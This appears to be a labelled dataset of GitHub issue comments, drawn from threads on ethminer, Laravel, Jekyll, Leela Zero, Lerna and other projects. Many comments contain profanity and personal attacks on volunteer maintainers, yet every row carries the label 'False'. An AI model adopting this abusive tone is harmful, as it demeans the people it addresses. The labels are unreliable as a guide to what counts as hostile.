eth-phishing-detect/MetaMask/653/357881695,653,"I do mot want your moneu, guy. This has nothing to do with me. You lent David 0.1 ETH to buy a computer power supply. That is not his monthly salary. He is a european, he does not work for 0.1 ETH a month. I have my chatlog with David too, I was talking to him, worried that your company was a scam (which it seems to be!). You are hurting people you hired, who worked for you. You are such a fool. I am just one guy who thinks you are a scam, I am not important. Welcome to cryptocurrency where your project needs code and a meaningful whitepaper to not be a scam, tough I know. You have a contract with David, he was your employee, he made you money, and you are not going to pay him. Contracts do not matter to you. You change contracts as the market needs. You got millions in investment from 116m with no code, and then changed it to 197m today. You are so bad. ",,False
ethminer/ethereum-mining/1405/347101773,1405,"Please stop with all the changes. Ethminer was absolutely fine, ran and performed great. -FS exit is sorely missed here at my end. I see you have finally made amends by adding failover-timeout, which does indeed now move batch file on to next algo. -P exit did not do this, as it was advised to do! However with latest ethminer 16 dev2. A drop of speed of just over 1mhs for me. not impressed. Print out of speed and gpu speed (the same thing) what is purpose of reporting 2 speeds? why you feel the need to make changes that are not needed I dont get. etminer is, kinda was, a great miner. Now you messing around with it too much. How you have managed to mess something up that was in such great condition I do not understand. Just stop, get back to basics, sort it and leave it. This transition should have been simple. ",,False
ethminer/ethereum-mining/1405/410003589,1405,"How is -P exit different to -FS exit  should work as before and did last i checked. Also if you dont like the changes don't use the newer versions, use different miner altogether or fork and only do stuff you like in a miner. ",,False
ethminer/ethereum-mining/1405/410034425,1405,no -P exit is not shifting batch file onto next algo nor is it behaving like -FS exit. Why do you think they have added this &gt; failover-timeout this command now exits ethminer and onto next miner. without that ethminer just loops trying to reconnect with -P exit or without.... my batch is for multi algo on mph. ,,False
ethminer/ethereum-mining/1405/410074698,1405,"1.) Report an issue and use an appropriate subject and fill it with constructive content 2.) 0.16.0.dev2 (remind the dev2) is a development snapshot - means current source compiled and bundled 3.) If you would supply us with more info like OS, GPUS, ethminer --list-devices, ... possible we can help better  getting back your missing 1MHs! 4.) failover-timeout is the time after that ethminer tries to reconnect to the main pool which is the first -P parameter (you must not specify the failover-timeout parameter !) 5.) Maybe you can explain more detailed what has changed and make problems as I still not understand Would be helpful to get (at least a part) of your batchfile to understand what's the problem 5.) If you like the old versions you can  download them at  the repo, go back in history and compile your preferred version  6.) Create PRs or Issues and submit us your sorted basics ",,False
ethminer/ethereum-mining/1405/410082355,1405,"the changes required to compensate for the mhs loss makes no difference. as the speed would be and is faster on v15, with any increments in power to gpu than v16. i got speed back. at same settings is over 16mhs on v15.... gpu is rx480 8gb ref. Al I want ethminer to do is what it did before and that is the -FS exit function. It is required to exit ethminer. I run a batch file that switches algos based on profitability, as i am sure a lot of other users do too. -P exit is not doing this for ethminer. Im terribly sorry I think I made a mistake regarding failover-timeout. I am currently testing it out and waiting on an algo switch. Im sure it did it, not 100% though. my apologies. ",,False
ethminer/ethereum-mining/1405/410160063,1405,To have the miner exit (with -P exit) imidently after a disconnect (of any kind) you need to use --farm-retries 0  (i think thats the param) otherwise it tries to reconnect up to 3 times to reconnect to current pool before switching to new pool (which is in our case the exit command) ,,False
ethminer/ethereum-mining/1405/410262230,1405,"nope. ethminer just wont exit and move onto next algo/miner in batch. -P exit, --failover-timeout 0, --work-timeout 1, --exit, --response-timeout 2, --farm-retries 1 none of these work. just keeps looping trying to reconnect to ethash algo. and none do what -FS exit did.  ",,False
ethminer/ethereum-mining/1405/410272900,1405,Can you repeat the very same test with 0.16 please ? ,,False
ethminer/ethereum-mining/1405/410274576,1405,And please remove --failover-timeout as it does not apply to your environment. ,,False
ethminer/ethereum-mining/1405/410274961,1405,"Also would be helpful if you could post the ""full"" command line arguments. it's not clear if you tested those one by one or in some sort of combination. ",,False
ethminer/ethereum-mining/1405/410275011,1405,that screenshot is from latest v16dev2. those commands were entered individually. they are a list not an order ,,False
ethminer/ethereum-mining/1405/410275900,1405,You should then test with ,,False
ethminer/ethereum-mining/1405/410278190,1405,does that work for you? as it is not for me. ive exhausted all combos with the above. i will wait it out and see what v16 final is like. back to claymore for now ( ,,False
ethminer/ethereum-mining/1405/410283028,1405,Could you please report what is the output of ethminer.exe -V I am asking as the output of your screen-shot does not appear to belong to 0.16 ,,False
ethminer/ethereum-mining/1405/410286892,1405,sure my mistake. same thing though.  ,,False
ethminer/ethereum-mining/1405/410288316,1405,Think I got where the problem is. Please one more last test ,,False
ethminer/ethereum-mining/1405/410290366,1405,Nevermind ... it won't allow --farm-retries 0 ,,False
ethminer/ethereum-mining/1405/410290467,1405,did you test that before you posted it? I have done that. before i even came here to make this post. if you had tested it you would not have posted it. by looks of it you have not even read the help files. im done with this for now. ,,False
ethminer/ethereum-mining/1405/410295874,1405,"First of all please calm down. We're here to help. I'm not here to undergo your rude attacks. I'm one of the devs and just now I am addressing this specific issue. (In particular I'm the one who has made most of the changes in the stratum protocol detection). So please, again, calm down and be patient. ",,False
ethminer/ethereum-mining/1405/410323154,1405,./ethminer -G --report-hashrate --HWMON 0 -P stratum+tcp//mhubaccount.workerx@friend.ethash-hub.miningpoolhub.com20535 --api-bind -3333 --cl-local-work 64 -P exit Results to this  think u are using wrong port number. ,,False
ethminer/ethereum-mining/1405/410386011,1405,"as far as i understand, what he wants is, that the miner exits after it gets disconnected from the pool for whatever reason. (pool closed, network error, whatever) I think that was the behavior with -FS exit.  So we should allow --farm-retries 0  and hint about that within the -P exit  command desc. I also would suggest renaming --farm-retries to something different (or alias it) like --pool-retries or something. ",,False
ethminer/ethereum-mining/1405/410427327,1405,@friend is right. There are some topics to take into account  --farm-retries should allow 0 which means no-retry at all on a failed connection ... step to next in queue actually there is a missing check on failure for mining.authorize method which does not invalidate connection. It should instead vector of connections should be accessed by the at() method instead of direct random access [] as we're removing invalidated connections. Direct random access [] does not throw if out of bounds while at() does. Problem is vector.erase method apparently rearranges it's internal array   Figure this where you have a vector of 2 elements (thus size() is 2) you'd expect vector now holding only 1 element (and in fact is) after removal of the first (of two) element. But here comes the problem. If you access vector like this  ♠cout &lt;&lt; m_connections[0].Host();` instead of getting the first (and only) element left (which should be reasonable) you get some sort of unspecified behavior which outputs data from some randomly allocated memory. ,,False
ethminer/ethereum-mining/1405/410437062,1405,"Correct, but this doesn't excuse the issuer's behaviour. ",,False
ethminer/ethereum-mining/1405/410442876,1405,"Well your choice of words for the initial issue. Instead of filling out an issue ticket based on the template and describing the problem -P exit does not work for your use-case, while -FS exit worked before,  You did a bit of a rant ) ",,False
ethminer/ethereum-mining/1405/410437591,1405,@friend my behaviour? I am just tired with users like you who post nonsense. wrong port? really? what a waste of your time posting that message only to conclude that I am using wrong port.... you are wrong. @friend I am calm (do you see any caps or exclamation points?. was more bewildered than anything when I read your reply. you said to try something that does not work and is not a valid setting for that command.... @friend most sense relating to -FS exit function I have read. thanks ,,False
ethminer/ethereum-mining/1405/410445557,1405,"@friend ... there are many ways to appear rude and those do not necessarily imply usage of capital letters or exclamation points. Everyone here uses his/her time on voluntary basis, not being paid, only guided by the desire to help and to improve. Full stop. We do not owe you anything and you don't pay anything for using this software. This said I apologize for giving you a wrong advice but have you counted how many lines of code there are and how many devs contributing ? Sometimes, as we're all human, we make mistakes or, simply, do not recall well which was the correct syntax and/or range of values. If you do not understand this please stay with Claymore which, as you pay a fee for it's usage, should give you a SLA. But I am pretty sure there's not ! This ticket is closed and on hold. Bye. ",,False
face_recognition/ageitgey/311/290186519,311,seriously some of us are drunk why do you have to name it face_recognition do you know how many time i have to hit backspace just to type that right why the fuck you cant just call it frec or facer seriously facer sounds so much cooler anyways. better have a damn good answeer. the fuck u think this is? a game? ,,False
face_recognition/ageitgey/311/359321383,311,User blocked and reported ,,False
framework/laravel/26340/376357782,26340,"So back in January I created issue #22833 wondering about the state of releases since many of them contained breaking changes. Now since the release of 5.7 it seems the situation still hasn't improved. For example, in the 5.5 changelog we can see 5.5.43 has a change which states Now, excuse me if I am being stupid here, but on Laravel's own website, it says The worst part is that this was only reverted 32 days later, after people had already upgraded and then had to revert those changes back to the old way. I cannot understand how/why this was ever accepted into a minor release when you clearly state breaking changes should never occur in minor releases. Notice the 'never' in bold right there. However, in 5.5.40 we saw In 5.7.11 In 5.7.8 5.7.5 My advice to people using this framework don't upgrade minor versions, if you do things will randomly break, and a revert could be sent in after a month causing another breaking change after people had updated the framework, adapted to the breaking change and then had to revert those changes again. Completely amateur and taylorotwell clearly does not care about 'breaking the user'. Maybe he needs a chat with Linus Torvalds. ",,False
framework/laravel/26340/435016577,26340,"You're right. They shouldn't contain breaking changes. Unfortunately with such a large user base, edge cases will happen and things will slip in. When we're notified about those we do our best to revert those changes back and undo any wrong-doings. Sometimes this means that some time can creep in between the released breaking change and the fix. Software development can be hard and by no means we intentionally want to break people's systems and apps. Software without bugs doesn't exists and is a myth. But we do our utmost best to keep these breaking changes to a minimum. This couldn't be further from the truth. If all you're going to do is complain then please refrain from opening up issues. Use  if you want to propose a new release schedule and have a civilized discussion about it. ",,False
framework/laravel/26340/435019680,26340,"@friend thanks for closing the issue and completely removing the chance for meaningful discourse. I admit I come across strongly only because I reported this in January and we're still seeing the same thing release after release. Yet you didn't address why the changelog has, in capital letters ""BREAKING CHANGE"". How those words ever made it into a changelog for a minor LTS release is beyond me, then it was reverted after 32 days... This was quite clearly, quite obviously intentional. We're not talking about bugs here, which are understandable, but people making PR's without realizing the impact they have on actual end users and applications. Instead, you bury your head in the sand, pretend the issue doesn't exist (or more obviously, you don't care) rather than trying to figure a viable medium, such as what I proposed before RC's or betas like most semver applications. If Taylor cared, he'd stop shipping as often and actually test his releases, but as it stands, we get reverts every 3 or so releases. And so it will continue. I have no doubt I'll be back for 5.10 or 6.3 and the same merge-oops-it-broke-revert system you guys have going will still be in effect. ",,False
framework/laravel/26340/435218687,26340,"Some of the unfortunate breaking changes could have easily been avoided. Or, at least, the filesystem change break. When I first saw the PR it had alarm signs all over it yet this was done on 5.7 (and merged and reverted, etc.), rather on 5.8. For my taste, way too much things are ""changed"" in minor version. Except changes to tests, I think half of that stuff should go in 5.8 or master. But understandably, contributors are eager to get their stuff out and in again on their project due to the rapid release and this attracts contributors. But here we've good/strong react from the other side, off-putting/discouraging. A fun little Epiphany I just had because I commented on   people go ~berserk~ totally strong on all the fiddle formatting rules, yet breaking changes rather easily creep into releases… | ",,False
framework/laravel/26340/435228362,26340,"@friend they don't care otherwise they would implement changes to ensure breaking changes are impossible (RC's and betas for example). Guess it's easier to merge and revert users be damned. Shame but it is what it is, they're not good at taking criticism that hurts their egos, especially Taylor who seemingly can do no wrong... ",,False
framework/laravel/26340/435099860,26340,"A few things to note. The ""issues"" for this repository is for reporting bugs. The laravel/ideas repo is for these discussions. This is why the issue was closed. Secondly, you make some good points, but as a long time user of other large frameworks, breaking changes slip through sometimes, then get reverted. Last, you should never update composer dependencies on a production project without fully vetting in a dev environment. Even patch, now called ""minor"", releases can have occasional breaking changes with regard to bug-fixing and security. Blindly running composer update without checking the changelog or ""releases"" page, is a recipe for disaster. If the changelog isn't clear, look at the actual commits. If your app is that important, you should at least scan every change that is made to the code base before using. Even so, there could be more time available for PRs to be vetted by the community to help recognize breaking changes before the code is pushed. ",,False
framework/laravel/26828/390592745,26828," Laravel Version 5.6.29 PHP Version 7.1.21 Database Driver &amp; Version MySQL 5.7  Description  above warning seems to be not accurate since not only the 'id' column must be included, but also any other 'foreign key' and 'local key' of the relationship being eagar-loaded, otherwise it'll fail without them manually specified. First off, the documentation is warning users about the usage inaccurately. Secondly, it seems unnecessary for us to manually specify the foreign &amp; local keys when using ""with()"", since the ""relationship"" already dictates their necessity in facilitating the eagar-loading. Why not just automatically include them by default? Steps To Reproduce ",,False
framework/laravel/26828/447010621,26828,"Heya, unfortunately we don't support that Laravel version anymore. Can you please try to upgrade and see if the problem persists? ",,False
framework/laravel/26828/447016815,26828,"The quoted documentation clearly says 5.7 correct? It does say we need to manually specify id instead of automatically handled by the framework, correct? So why is this closed so quickly merely because I stated an outdated version? I can test any way I choose to but this quick closing of an issue is not allowing healthy discussion sadly. ",,False
framework/laravel/26828/447017080,26828,@friend you've reported an issue for Laravel 5.6 ,,False
framework/laravel/26828/447017245,26828,This idea has been declined ,,False
framework/laravel/26828/447017667,26828,"@friend everyone knows that, and you've closed it, heh. ",,False
framework/laravel/26828/447018077,26828,@friend we don't support 5.6 anymore ,,False
framework/laravel/26828/447018353,26828,There have also been multiple (unsuccessful) attemps to improve this sentence in the documentation. ,,False
framework/laravel/26828/447020027,26828,If all you're going to do is complain then please refrain from posting issues 🤷🏻‍♂️ ,,False
iD/openstreetmap/4880/304697979,4880,"On  that number, 7438-35? Well there is no way for the user to make it temporarily bigger to be sure he read it correctly, Zooming only helps for a second. OK he can do CTRL++++ . OK I suppose that will have to do. ",,False
iD/openstreetmap/4880/372612022,4880,"If he does CTRL++++ he will have to remember to do exactly CTRL+---, otherwise he will have messed up his original situation. ",,False
iD/openstreetmap/4880/372615734,4880,"Wait, CTRL++++ only helps for one second... ",,False
iD/openstreetmap/4880/372704182,4880,"Changing the size of this text is something you can do with Stylish see   think it would be fantastic if somebody made a Stylish theme for iD, specifically for mappers with poor vision - maybe to adjust the size of text and contrast of the rendered elements. ",,False
iD/openstreetmap/4880/372930017,4880,Yes but that is a hack. ,,False
iD/openstreetmap/4880/413535975,4880,"Please add a slider. If users were so smart that they could use external solutions, they probably wouldn't be using a web based editor in the first place. ",,False
iD/openstreetmap/4880/413544776,4880,@friend It's not ok to insult the users. ,,False
iD/openstreetmap/5296/357385667,5296,"In my opinion one of the worst updates iD got so far. I can sill include a gpx track, but to get there I have to take another step. Dowloading something from the web is nice, but I will never use that. Where is the problem to put them below each other and not have them inside a sub menu. The worst thing is that the gpx track is clickable. Since my GPS device is pretty accurate it's almost always on the way and selecting the way and not the gpx file is sometimes impossible. Grabbing a single node to move it? You can forget that one good Sir! Trump says ""GPX file first!"". If there is a need to show the track stats (three of them so far and I couldn't care less about any of them) it can be moved over to the side menu where you select it from your HDD. If you make such changes, please give me at least an option to switch back. The new version is nothing but garbage for me. It is so bad, it gives me cancer. BTW I'm pretty pissed if it wasn't clear until this point. ",,False
iD/openstreetmap/5296/418867666,5296,"Wow, not nice @friend.  We've already got #5257 for this, you don't need to be a jerk. ",,False
jekyll/jekyll/6844/304422453,6844,"Hi, Jekyll syntax highlighting is broken with Twig. Consider the following code block containing a perfectly valid Twig syntax It outputs the following HTML Notice the err class attributed to the equal sign. Steps to reproduce  Follow the official quick-start guide  the content of the post created by the installation with this  ",,False
jekyll/jekyll/6844/372357726,6844,How is the resulting output if you were to use triple-backticks instead? ,,False
jekyll/jekyll/6844/372362713,6844,So you see the issue is not with Jekyll but rather with Rouge that  and the triple-backticks block uses to highlight code. ,,False
jekyll/jekyll/6844/372374996,6844,"No, the problem also happens with the  syntax. ",,False
jekyll/jekyll/6844/372378503,6844,"Yes, that's because the  tag uses  for syntax-highlighting by default  you want to use  instead of  as your site's highlighter, add the following to your  ",,False
jekyll/jekyll/6844/372381451,6844,This sounds like an issue with  rather than Jekyll. Jekyll has no knowledge of syntax of any language. ,,False
jekyll/jekyll/6844/372383292,6844,"@friend, why did you close this? It's not fixed and I'm not the one explicitely using Rouge. The maintainers of the project are using a dependency that is buggy, they should take care of this. ",,False
jekyll/jekyll/6844/372397547,6844,"I’ve provided a link to the repository so that you can open an issue there and explain the problem you are having. I do not know what “Twig” is, so it would not make sense for me to be the one to explain what needs changing in Rogue. There is nothing in Jekyll’s code that can be changed to fix this issue; the fix will have to come from Rogue. Here is a link to Rogue’s Twig lexar ",,False
jekyll/jekyll/6844/372400893,6844,"That's not my point. You are the one using Rouge to implement a feature that you advertise explitely on your docs! That's your responsibility to take care of things that don't work as expected in the dependencies of your project. As a consumer of your product, I expect it to work as advertised  are advertising syntax highlighting, you are supposed to deliver! And if you don't, you are supposed to take care of whatever is needed to have your product work as expected. And don't start me with open-source and this-product-is-free. If you embrace open-source concepts, you also embrace the responsibility that comes with it. ",,False
jekyll/jekyll/6844/372406665,6844,@friend We're sorry that you're facing issues while using Jekyll. I agree that you as an end-user shouldn't concern yourself about bugs in dependencies. One of the maintainers will get in touch with the developers at Rouge and sort things out for you. ,,False
jekyll/jekyll/6844/372407373,6844,"@friend, thanks a lot. I already created an issue, maybe a maintainer could comment on it if it's not clear enough ",,False
jekyll/jekyll/6844/372407740,6844,"@friend Please take a step back and consider that this is an entirely volunteer-run project. We're not contractually obligated to work on every bug and answer every question, seeing as we simply don't have enough resources. So our apologies if some things take too long, or don't end up happening, but it's wrong to blame the maintainers for this. ",,False
jekyll/jekyll/6844/372412152,6844,"@friend, I totally understand that and i can relate maintaining open source projects is very time-consuming. But I'm not having that discussion because I want to see that bug fixed immediately, to be honest this is a low priority bug even by my own standards. My point is that if, when a bug happens, maintainers blame a dependency, close the issue and ask for the reporter to open an issue elsewhere, that could go that way Jekyll Oh, sorry this is a bug with Rouge, go open an issue there. -&gt; Rouge Oh, sorry this is a bug with Ruby, go open an issue there. -&gt; Ruby Oh, sorry this is a bug with GCC, go open an issue there. ...and so on. At one point, my issue will be invalid because I won't even know what and how to report the bug. Already, Rouge maintainers could totally close my issue as invalid because I'm giving a way to reproduce that imply Jekyll - it would be legitimate for them to say that it's a Jekyll bug or that they want a reproducible example using only Rouge. ",,False
jekyll/jekyll/6844/372413773,6844,"@friend The way I see it, this issue could pop up in any software that uses Rouge, and is therefore not specific to Jekyll. I agree however that it could have been better communicated before it was closed, sorry about that. ",,False
jekyll/jekyll/6844/372415507,6844,@friend I re-opened the issue to convey that we have not abandoned this report straight away.. Do know that I've kept a tab on the issue-ticket at Rouge and will follow its proceedings as time permits.. ,,False
jekyll/jekyll/6844/401623176,6844,"This issue has been automatically marked as stale because it has not been commented on for at least two months. The resources of the Jekyll team are limited, and so we are asking for your help. If this is a bug and you can still reproduce this error on the &lt;code&gt;3.3-stable&lt;/code&gt; or &lt;code&gt;master&lt;/code&gt; branch, please reply with all of the information you have about it in order to keep the issue open. If this is a feature request, please consider building it first as a plugin. Jekyll 3 introduced hooks which provide convenient access points throughout the Jekyll build pipeline whereby most needs can be fulfilled. If this is something that cannot be built as a plugin, then please provide more information about why in order to keep this issue open. This issue will automatically be closed in two months if no further activity occurs. Thank you for all your contributions. ",,False
jekyll/jekyll/7432/393681341,7432,"Plase, add a step on the Step by Step Tutorial to demonstrate how to theme the just finished demo app. Motivation  Theming is not an obvious task for a newbie like me. Also, doc speaks about gem based and 'regular' file themes. It's confusin  a bit. At the end of demo app it's more beautiful to leave in the han of the user a well looking demo  Idea Please include istructions on  how to enable default gem base theme how to customized if possible a gem theme how to switch to a regular file based theme idem, how to customize it  ... or ... Create a guide on how to start theming AND then include previous steps into the new tutorial. Thanks for this excellent piece of software !!!! ",,False
jekyll/jekyll/7432/449582031,7432,"On how to start theming for Jekyll, I'd recommend @friend articles  ",,False
jekyll/jekyll/7432/449763207,7432,"Thanks, but it's better have an official doc, and not links to external resources. IMHO ",,False
jekyll/jekyll/7432/450029809,7432,If it's validation you're looking for then I can 100% endorse these tutorials ✨. However if you want this set in stone then maybe we could link to these tutorials in the official docs? Maybe in  or  What do you day @friend? ,,False
jekyll/jekyll/7432/450207517,7432,What about allowing Jekyll sponsors to post tutorials directly on the site. Each post has a  content sponsored by CTA use rel=”canonical” tag to sponsors blog. Author of the article gets paid by the sponsor. Jekyll gets better docs.  ,,False
jekyll/jekyll/7432/450211638,7432,"IMHO, Documentation is one thing and a (sponsored) community blog is an entirely different league altogether. They should not be intermingled. Documentation is translating ""the code base"" into layman lingo. (Point-of-View Maintainers -&gt; Users) Community blog is about sharing experience with the code base. (Point-of-View One User -&gt; Other Users) Bringing the sponsors into the mix, is just complicating things, unnecessarily......... ",,False
jekyll/jekyll/7432/450227945,7432,Hi @friend I agree with you here. I'm thinking the Tutorials section could highlight the community in this way. ,,False
jekyll/jekyll/7432/450236747,7432,Sorry but ... To rest in topic... A simple step added to main step by step intro is so wrong? ,,False
jekyll/jekyll/7432/450398231,7432,"I don’t see what is wrong with referring to a tutorial on another site? Yes the tutorial was paid for, but tutorials of that size take time to create. Maybe we could add some more detail on the points people are getting stuck on in the docs? ",,False
jekyll/jekyll/7432/450413054,7432,"If I see a tutorial on an external website it soon or later will become obsolete. If I see a tutorial on main site I think that must be ok, tested, and updated. Simply. Close this issue A company that does not understand the need of a full doc do not will offer a serious support in the long time Bye bye. ",,False
jekyll/jekyll/7432/450416440,7432,"Jekyll is an open-source project freely maintained by volunteers, it has been around for 10 years now and powers hundred of thousands of websites around the world. Jekyll has a great community and docs are continuously improved with the help of the contributors. Jekyll themes are documented. I'll see if I can add some links to point to theming at the end of the step-by-step guide. ",,False
leela-zero/gcp/1216/382223778,1216,"Some info on this game Network 3217 is used (20x256 v9), binary is compiled from  with ponder on Move 191 is commented as the winning move by pro player ( file and win rate below 20180417_Golaxy_v9.txt.gz 20180417_Golaxy_v9.sgf.gz  ",,False
leela-zero/gcp/1216/382225082,1216,Is there a english commentary version? ,,False
leela-zero/gcp/1216/382247750,1216,Is there log for game 3? People are curious about the two 3-3 LZ played. ,,False
leela-zero/gcp/1216/382385455,1216,Game 5 who won? I can't read Chinese. ,,False
leela-zero/gcp/1216/382388505,1216,"Game 5 Galaxy (B) vs. Leela Zero (W) First B move (m,n) with m,n&gt;5 Result Leela Zero won. Galaxy time ",,False
leela-zero/gcp/1216/382389352,1216,"I also heard conflicting reports that it was score of B+2.5 , so that means had it not timed out the golaxy would have won ? ",,False
leela-zero/gcp/1216/382390258,1216,My leela was reporting close to 99% winrate when black resigned. Also after playing the rest of endgame myself score was W+0.5. ,,False
leela-zero/gcp/1216/382391425,1216,"@friend thanks for the info. So there is two matches left. Its time to have LZ use the same quality of hardware that Golaxy is afforded to use, and a real official net, and no handicap. ",,False
leela-zero/gcp/1216/382399342,1216,"@friend We said it multiple times, hardware are similar. ",,False
leela-zero/gcp/1216/382400443,1216,"I heard that, but oczam rasor. if its so similiar (which I'm not necessarily disputing) why not just ues exactly the same to remove all doubt and be more scientific as control and fixed control etc In points of fact, one of the matches at least, its LZ only used 5x 1080Ti where Golaxy used 10x1080Ti, and then they stated ""titanV not optimized"" (not sure if that talking about the Nvidia issue with titanv where its calculations get messed up, or that the team can't get LZ to play optimillay on the TitanV or combination of all of the aboves etc) so I don't see how it can be similar if its at 50% and then buggy ",,False
leela-zero/gcp/1216/382402516,1216,I heard today they used 5x1080ti again today. Golaxy insists on using 10x1080ti. The LZ team has to use whatever they can get hold of. ,,False
leela-zero/gcp/1216/382403472,1216,"@friend wow really? considering the 6th line move was less than one stone handicap, and that the fact that Golaxy CHOOSE to play other moves higher going for influence strategy, I would say that LZ could have beat golaxy on even if they used hardware parity. ""LZ team has to use whatever they can get hold of"" ? You mean they can't go on aws and rent out 8x V100 for a match or two? ",,False
leela-zero/gcp/1216/382416162,1216,So wasn't it said after the seven games Golaxy was gonna play ke jie? Why can't LZ also play Ke Jie? ,,False
leela-zero/gcp/1216/382416873,1216,I'd imagine Ke Jie is being paid to attend and play. Top pros don't do public exhibition matches for free. ) ,,False
leela-zero/gcp/1216/382485249,1216,You must be really rich. Renting 8xV100 costs 42$/hr. So we will cost 42 $/hr  3 hr  7 d = 882 $. I would rather save 882$ and buy a GTX 1080 to produce tens of thousands of games. ,,False
leela-zero/gcp/1216/382489234,1216,"@friend I was under the impression that both the golaxy team and the LZ team for this match are volunteer groups in China. They even seemed to have a fancy dinner before the start of game 1 night. Seeing how five out of seven games have already been played and each game lasts between 1 to 2 hours, this would be only a few hours of renting the 8x v100. Does not seem unreasonable esp when given the context of Golaxy going on after the 7 games to play Ke Jie and the spectulation from roy777 that they were playing Ke Jie to play against their AI bot. ",,False
leela-zero/gcp/1216/382494819,1216,Scenes of Golaxy running  behind Golaxy  did you get the impression that Golaxy is run by volunteers? ,,False
leela-zero/gcp/1216/382495555,1216,"Oh my mistake... I didn't know Golaxy was a company.... btw @friend not sure where you got your $42, its actually $24/hr  instance ",,False
leela-zero/gcp/1216/382607320,1216,@friend It seems that renting V100 in East Asia costs much more than in US. You may see $42 or $40 in Tokyo and Seoul. ,,False
leela-zero/gcp/1216/382711644,1216,they got bribed by glolsxy match 6 only three 1080 ,,False
leela-zero/gcp/1216/382712577,1216,"I think there was an operator misclick today. Leela played the ""obvious"" joseki move which according to the recent network is a 15% mistake. ",,False
leela-zero/gcp/1216/382712725,1216,"@friend seriously, you have to stop reacting like a crazy tinfoil hat person without knowing anything about context or facts. If they can't have 10 1080ti for the match, so be it, they are not a rich company, they are passionate people trying to put a good show against golaxy, that's all. ",,False
leela-zero/gcp/1216/382714533,1216,prob next excuse our computer rebooted midgame cause of OS update ,,False
leela-zero/gcp/1216/382715334,1216,"serious question who misclicks 2 games out of only 7 between all the misclicks, operator arriving late due to getting stuck in traffic, finding out about titanV ""not optimized"" for LZ until AFTER match already started, using only 1/2 and then only 1/3 the horsepower than its opponent, not knowing about, and not testing the tree size issue prior to game 1, and changing hardware specs every single day, using mystery networks that so far as I know have yet to be published, not publishing logs in the later games of the match.... this is very unprofessional. I could have done a better job than this without any doubt. ",,False
leela-zero/gcp/1216/382726749,1216,"I was opposed to the weight of 20B. 15B before the debut 20B weighted more than 80% of the 10B win rate, hardware configuration enough to play; now the 20B to the official 15B winning rate never reached Qi Cheng, and this 60% win rate is still more than double the amount of computing to achieve The hardware that is required to use or not to defeat or even exceed 15B is too high. Did not find out this sector to reduce the use of 20B, is sent in vain.  from ",,False
leela-zero/gcp/1216/382734068,1216,"@friend that translation was hard to read. apparently if I understood correctly, someone was opposed to using the combination of higher sized network like the 20block in conjunction with minimial hardware like the 3x 1080, but the advice was sent in vain because no one listened and then they lost to a misclick or aka error of the connector of the operator l My question is since this match was agreed upon, scheduled and announced in advance, how did they not make sure of securing at LEAST the same hardware as golaxy prior to starting the games? This just doesn't make sense. Edit Yes I understand they are volunteers doing it out of labor of love etc etc, but that doesn't mean they should be immune to all criticism for setting up a blotched match, and when one side is using just 30% of the resources of the other side, I call it exactly and precisely that, a blotched game. ",,False
leela-zero/gcp/1216/382743099,1216,"Yes, the computation power is for sure imbalanced we know. But what can we do if we do not have such a configure, what can you do if one of volunteers is sick one day? What if the 0.13 release still has a pondering bug you didn't notice? The main point of this match is just for fun, people behind it do it for free, so why are you so mean about it? Who can guarantee to hold a match first time without any issue? If you do not like it, please do not waste your precious time watching, organize your own match instead, with whatever configuration you've got, I don't care. Talk is cheap. ",,False
leela-zero/gcp/1216/382747177,1216,"@friend When LZ volunteer team decided on their own volition to schedule and then announce to the broader general public these sets of games, it set itself on the trajectory of creating certain reasonable expectations as par the course of the typical kind of Go match. Had I know ahead of time all the things that would go wrong, all the shenanigans that would be pulled, then maybe that information would have been vital to my deciding how much of my own time and attention I would like to dedicate to watching this unfold, and I’m sure the same or similar could apply to other people in the public community as well.  Once again, when they started the game with the explanation that they had tested 4xTitanV to be equal to performance of 10xGTX1080Ti, they mentioned nothing about the possibility that the rest of the games would have LZ using MUCH LESS hardware specs than its Golaxy opponent. By first giving the impression of a ‘fair’ match by stating that after extensive testing the 4xTitanV basically == 10x GTX1080Ti on perf parity and then only later on mid match flip flopping (for whatever reason or excuse, valid or invalid, but I call it as it is, and this was a bona fide flip flop) by using half and then 3/10th the power, this at the very least FEELS like a bait and switch in which they used a ruse to get people invested emotionally leading them to believe this would be a fair /even match and then did a roundabout by not delivering on almost every metric and standard. And now I suppose the unofficial networks used and the logs for the latter half of the games of the match will not be released to the public as well? For what reason could that be?! ",,False
leela-zero/gcp/1216/382748042,1216,"@friend I don't know if someone can get ban of a github and what rules are in place, but if it was up to me you would get ban. There is a pretty big difference between giving feedback or criticism and being straight up rude and mean. At my work someone who would behave like that to their coworkers on a project would be fired. ",,False
leela-zero/gcp/1216/382749971,1216,"@friend if you want to talk about ""rules"" of github then per the license and per the rules they (the volunteer LZ team) have to release the modified networks to the public afaik. It is my understanding that as of yet, they have not done so. ",,False
leela-zero/gcp/1216/382750294,1216,"I'm not so much bothered about the disparity in hardware (which of course makes it unfair, but that is capitalism for you), but about the fact that settings/networks/hardware are apparently being changed mid match. This means a simple thing it was not tested properly. Before you play the match or tournament, you figure out the optimal configuration. If you are even so much as tempted to change the configuration during the games, it means you did not test properly, because what information can you possibly have gotten in that time period that invalidates your prior test for the optimal configuration? Now, given that  this match is apparently not to be taken seriously, due to the above, and it seems even operator errors stand(?!)  people are starting to lose their shit over it there's no usable info for the development of LZ due to the above and lack of transparency  I'll just close this discussion. There's no use to bother or care about this. ",,False
leela-zero/gcp/1216/382750424,1216,The license only covers distribution. ,,False
lerna/lerna/1628/355253185,1628,A polite and hopefully unnecessary reminder that when the license change is released it should be a major version bump. I'm imagining the fall out that would occur if this were released as a patch version and it wouldn't be pretty. ,,False
lerna/lerna/1628/417050999,1628,"You're going to introduce a major license change, refuse to change the license name and do it in a minor version bump? What the actual hell is your goal here? ",,False
lerna/lerna/1628/417052979,1628,"To screw with companies that support ICE, was that not clear? ",,False
lerna/lerna/1628/417056940,1628,"By releasing a major license change as a minor version bump and using an incorrect license in the license field? You're screwing Lerna, not the companies listed. Ignoring you politicizing something that has no business being political (especially as a former Facebook employee... come on), literally every company listed is going to update their packages to pull from  and go back to work. Meanwhile you're getting massive community backlash that's only going to continue if you decide to be a child and inappropriately release this as a minor version bump or with the MIT license. The best thing feasible for Lerna at this point is you leaving the project. But since that's not going to happen since you apparently enjoy your soap box, the second best thing is everyone moving to a fork of the project without a politician having any control. The irony is I 100% agree with your politics, but this is not the place to express them. ",,False
